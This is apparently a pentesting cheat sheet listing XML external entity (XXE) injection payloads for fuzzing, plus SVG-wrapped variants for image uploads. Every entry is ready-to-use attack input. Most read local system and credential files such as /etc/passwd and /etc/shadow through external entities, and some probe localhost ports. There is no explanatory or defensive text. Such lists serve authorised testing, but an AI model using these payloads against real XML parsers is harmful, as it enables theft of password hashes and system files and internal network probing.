
# Fuzzing

```
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:80" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:443" >]>
```

## SVG

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
```